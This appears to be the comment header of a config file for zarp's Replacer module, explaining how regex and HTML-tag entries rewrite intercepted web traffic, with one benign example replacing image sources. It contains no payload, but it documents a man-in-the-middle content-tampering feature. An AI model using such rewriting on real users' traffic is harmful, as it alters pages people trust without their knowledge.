# zarp's match and replace config file for the Replacer
# module.  Entries should be listed in the following form:
#
#           match = match replace
#
# This module supports two different match forms; regex and HTML tags.  In
# the first case, anything that re.sub accepts, this will accept.  In the
# latter case, tags can be specified in the following:
#
#           2 img src = http://google.com
#
# This will parse each img tag and replace the src with http://google.com. To
# distinguish between the two types, 1 should be prefixed to regex entries, and
# 2 should be prefixed to HTML tags.
# 
# Several test entries have been listed here.  The regex isnt perfect because regex
# with HTML is a monster.
